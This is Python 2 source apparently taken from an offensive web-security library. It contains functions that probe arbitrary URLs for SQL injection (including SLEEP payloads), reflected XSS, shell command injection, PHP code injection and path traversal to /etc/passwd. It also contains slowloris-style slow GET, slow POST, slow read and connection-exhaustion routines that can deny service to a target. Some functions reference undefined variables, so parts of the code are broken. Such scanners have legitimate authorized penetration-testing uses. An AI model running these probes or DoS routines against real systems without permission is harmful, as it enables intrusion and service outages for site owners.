def sqlieb(u,logs=True,returning=False,timeout=10,proxy={}):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
   check the response body for any SQL syntax errors.
   it's an "Error Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlieb(domain)
   
   if returning was set to: True
   0 => not vulnerable
   1 => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 s=0
 if logs==True:
  print'[*]Error Based SQL Injection test'
 try:
  u+="'"
  rp= requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  r=rp.text
  if (('SQL command not properly ended' in r) or ('Query failed: ERROR: syntax error at or near' in r) or ('Unclosed quotation mark before the character string' in r) or ("You have an error in your SQL syntax" in r) or ("quoted string not properly terminated" in r) or ("mysql_fetch_array(): supplied argument is not a valid MySQL result resource in"in r)):
   s+=1
 except Exception as e:
  pass
 if logs==True:
  if s==0:
   print'[-]Not vulnerable'
  if s==1:
   print'[+]Vulnerable!!!'
 if returning==True:
  return s
def sqlibb(u,logs=True,returning=False,timeout=10,proxy={}):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding boolean opertations to the link
   and check the response body for any change.
   it's an "Boolean Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlibb(domain)
   
   if returning was set to: True
   0 => not vulnerable
   1 => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 s=0
 try:
  if logs==True:
   print'[*]Boolean Based SQL Injection test'
  r=requests.get(u+"+and+1=2",proxies=proxy,timeout=timeout)
  q=requests.get(u+"+and+1=1",proxies=proxy,timeout=timeout)
  r1=r.text
  q1=q.text
  if ((r.status_code==200)and(q.status_code==200)):
   if ((r1!=q1) and (("not found" not in r1.lower()) and ("not found" not in q1.lower()))):
    s+=1
 except:
  pass
 if logs==True:
  if s==0:
   print'[-]Not vulnerable'
  if s==1:
   print'[+]Vulnerable!!!'
 if returning==True:
  return s
def sqlitb(u,delay=15,logs=True,returning=False,timeout=25,proxy={}):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding a delay statement at the end
   of the line and check the delay of the response.
   it's an "Time Based SQL Injection" test.

   the function takes 5 arguments:

   u: the link to check
   delay: time giving as a delay for the database to do before returning the response
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlitb(domain)
   
   if returning was set to: True
   0 => not vulnerable
   1 => vulnerable

   timeout: (set by default to: 25) timeout flag for the request
'''
 s=0
 try:
  if logs==True:
   print'[*]Time Based SQL Injection test'
  t=time.time()
  r=requests.get(u+"-SLEEP("+str(delay)+")",proxies=proxy,timeout=timeout)
  if ((time.time()-t>=delay)and (r.status_code==200)):
    s+=1
 except:
  pass
 if logs==True:
  if s==0:
   print'[-]Not vulnerable'
  if s==1:
   print'[+]Vulnerable!!!'
 if returning==True:
  return s
def xssget(u,pl,extra=None,timeout=10,proxy={}):
  '''
   this function is for xss test with GET requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  i=0
  for x in pl:
   xp=pl[x]
  if extra:
   pl.update(extra)
  try:
     c=requests.get(u, params= pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
     if  HTMLParser.HTMLParser().unescape(xp).encode("utf-8") in c:
      i+=1
  except Exception as e:
   pass
  return i
def xsspost(u,pl,extra=None,timeout=10,proxy={}):
  '''
   this function is for xss test with POST requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  i=0
  for x in pl:
   xp=pl[x]
  if extra:
   pl.update(extra)
  try:
     c=requests.post(u, data= pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout ).text
     if HTMLParser.HTMLParser().unescape(xp).encode("utf-8") in c:
      i+=1
  except Exception as e:
   pass
  return i
def xss(u,payload=None,get=True,post=True,logs=True,returning=False,proxy={}):
  '''
   this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each
   input using POST and GET methods.

   it takes the following arguments:
   
   u: link to test
   payload: the xss payload to use it, if it's set to: None (set by default to: None) it uses the default payload
   get: (set by default to: True) to test the parameter using GET
   post: (set by default to: True) to test the parameter using POST
   logs: (set by default to: True) show the process
   returning: (set by dfault to: False) to return scan results of the parameters as list of strings

   usage:
  
   >>>import bane
   >>>bane.xss('http://www.example.com/')

   >>>bane.xss('http://www.example.com/',payload="<script>alert(123);</script>")
  '''
  lst=[]
  if payload:
   xp=payload
  else:
   xp='<script>alert("Vulnerable!!!");</script>'
  if logs==True:
   print"Getting parameters..."
  hu=0
  l=inputs(u)
  if len(l)==0:
   if logs==True:
    print"No parameters were found!!!"
   hu+=1
  if hu==0:
   if logs==True:
    print"Test has started...\nPayload:\n"+xp
   if '?' in u:
    u=u.split('?')[0].split(',')[0]
   for i in l:
    pl={i : xp}
    if get==True: 
     if xssget(u,pl,proxy=proxy)==1:
        x="parameter: "+i+" method: GET=> [+]Payload was found"
     else:
      x="parameter: "+i+" method: GET=> [-]Payload was not found"
     lst.append(x)
     if logs==True:
      print x
    if post==True:
     if xsspost(u,pl,proxy=proxy)==1:
     	x="parameter: "+i+" method: POST=> [+]Payload was found"
     else:
      x="parameter: "+i+" method: POST=> [-]Payload was not found"
     lst.append(x)
     if logs==True:
      print x
  if returning==True:
   return lst
def execlink(u,timeout=10,proxy={}):
 '''
   this function is for command execution test using a given link
'''
 u+='%3Becho%20alaistestingyoursystem'
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s+=1
 except:
  pass
 return s
def getexec(u,param='',value='',extra=None,timeout=10,proxy={}):
 '''
  this function is for command execution test using a given link and GET parameter
'''
 s=0
 value+=";echo alaistestingyoursystem"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s+=1
 except:
  pass
 return s
def postexec(u,param='',value='',extra=None,timeout=10,proxy={}):
 '''
  this function is for command execution test using a given link and POST parameter
'''
 s=0
 value+=";echo alaistestingyoursystem"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s+=1
 except exception as e:
  pass
 return s
def getinject(u,param='',value='',end=False,extra=None,timeout=10,proxy={}):
 '''
  this function is for PHP code execution test using a given link and GET parameter
'''
 s=0
 value+=";echo'alawashere'"
 if end==True:
  value+=";"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s+=1
 except:
  pass
 return s
def linkinject(u,end=False,timeout=10,proxy={}):
 '''
  this function is for PHP code execution test using a given link
'''
 s=0
 u+="%3Becho'alawashere'"
 if end==True:
  u+="%3B"
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s+=1
 except:
  pass
 return s
def postinject(u,param='',value='',extra=None,end=False,timeout=10,proxy={}):
 '''
  this function is for PHP code execution test using a given link and POST parameter
'''
 s=0
 value+=";echo'alawashere'"
 if end==True:
  value+=";"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s+=1
 except:
  pass
 return s
def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy={},timeout=10):
 '''
   this function is for FI vulnerability test using a link
'''
 x={}
 s=0
 l='etc/passwd'
 if (nullbyte==True):
  l+='%00'
 if ("=" not in u):
  s-=1
  return {"Status":s,"Reason":"doesn't work with such urls"}
 else:
  u=u.split("=")[0]+'='
 if mapping==True:
  for i in range(rounds):
   try:
    if logs==True:
     print'[*]Trying:', u+l
    r=requests.get(u+l,proxies=proxy,timeout=timeout)
    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
     s+=1
     x= {"Status":1,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print'[+]FOUND!!!'
     break
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print'[-]Status Code:',r.status_code,',something is wrong...'
     break
    else:
     l='../'+l
     if logs==True:
      print'[-]Failed'
   except Exception as e:
    pass
 else:
  l='/etc/passwd'
  if (nullbyte==True):
   l+='%00'
  try:
    if logs==True:
     print'[*]Trying:', u+l
    r=requests.get(u+l,proxies=proxy,timeout=timeout)
    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
     s+=1
     x= {"Status":1,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print'[+]FOUND!!!'
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print'[-]Status Code:',r.status_code,',something went wrong...'
    else:
     if logs==True:
      print'[-]Failed'
  except Exception as e:
    if logs==True:
     print'[-]Error Failure'
 if s==0:
  x= {"Status":s,"Reason":"not vulnerable"}
 if returning==True:
  return x
'''
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
'''
def buildget(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    return s
def timeouttest(u,port=80,timeout=5,interval=30,logs=True,returning=False):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nInitial connection timeout:',timeout,'\nMax interval:',interval
 try:
  s=buildget(u,port,timeout)
  i+=1
 except:
  if logs==True:
   print'[-]Connection failed'
  if returning==True:
   return 0
 if i>0:
  j=0
  while True:
   try:
    j+=1
    if j>interval:
     break
    if logs==True:
     print'[*]Sending payload...'
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    if logs==True:
     print'[+]Sleeping for',j,'seconds...'
    time.sleep(j)
   except:
    if logs==True:
     print'==>timed out at:',j,'seconds'
     break
    if returning==True:
     return j
  if j>interval:
   if logs==True:
    print'==>Test has reached the max interval:',interval,'seconds without timing out'
   if returning==True:
    return j
def slowgettest(u,port=80,timeout=5,interval=5,randomly=False,timer=180,logs=True,returning=False,start=1,end=5):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
 try:
  s=buildget(u,port,timeout)
  i+=1
 except:
  if logs==True:
   print'[-]Connection failed'
  if returning==True:
   return 0
 if i>0:
  j=time.time()
  while True:
   try:
    ti=time.time()
    if int(ti-j)>=timer:
     break
    if logs==True:
     print'[*]Sending payload...'
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    t=interval
    if randomly==True:
     t=random.randint(start,end)
    if logs==True:
     print'[+]Sleeping for',t,'seconds...'
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print'==>timed out at:',int(ti-j),'seconds'
    if returning==True:
     return int(ti-j)
    break
  if int(ti-j)>=timer:
   if logs==True:
    print'==>Test has reached the max interval:',interval,'seconds without timing out'
   if returning==True:
    return int(ti-j)
def connectionslimit(u,port=80,connections=150,timeout=5,timer=180,logs=True,returning=False,payloads=True):
 l=[]
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nConnections limit:',connections,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
 ti=time.time()
 while True:
  if int(time.time()-ti)>=timer:
   if logs==True:
    print'[+]Maximum time for test has been reached!!!'
    break
   if returning==True:
    return len(l)
  if len(l)==connections:
   if logs==True:
    print'[+]Maximum number of connections has been reached!!!'
   if returning==True:
    return connections 
   break
  try:
   so=buildget(u,port,timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    except:
     l.remove(s)
  if logs==True:
   print'[!]Sockets:',len(l),'Time:',int(time.time()-ti),'seconds'
def buildpost(u,port=80,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,port))
 if port==443:
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u))
 return s
def slowposttest(u,port=80,logs=True,timeout=5,size=10000,timer=180,returning=False,randomly=False,wait=1,start=1,end=5):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nData length to post:',size,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
 try:
  s=buildpost(u,port,timeout,size)
  i+=1
 except Exception as e:
  if logs==True:
   print'[-]Connection failed'
  if returning==True:
   return 0
 j=0
 if i>0:
  t=time.time()
  while True:
   if int(time.time()-t)>=timer:
    if logs==True:
     print'[+]Maximum time has been reached!!!\n==>Size:',j,'\n==>Time:',int(time.time()-t)
    if returning==True:
     return int(time.time()-t)
    break
   if j==size:
    if logs==True:
     print'[+]Maximum size has been reached!!!\n==>Size:',j,'\n==>Time:',int(time.time()-t)
    if returning==True:
     return int(time.time()-t)
    break
   try:
    h=random.choice(lis)
    s.send(h)
    j+=1
    if logs==True:
     print"Posted: {}".format(h)
    if randomly==True:
     time.sleep(random.randint(start,end))
    if randomly==False:
     time.sleep(wait)
   except:
    if logs==True:
     print'[-]Cant send more\n==>Size:',j,'\n==>Time:',int(time.time()-t)
    if returning==True:
     return int(time.time()-t)
    break
def slowreadtest(u,port=80,logs=True,timeout=5,timer=180,returning=False,randomly=False,wait=5,start=1,end=10):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if time.time()-ti>=timer:
      if logs==True:
       print'[+]Maximum time has been reached!!!'
      if returning==True:
       return int(time.time()-t)
      break
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),u))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print"Received: {}".format(d)
      if randomly==True:
       time.sleep(random.randint(start,end))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
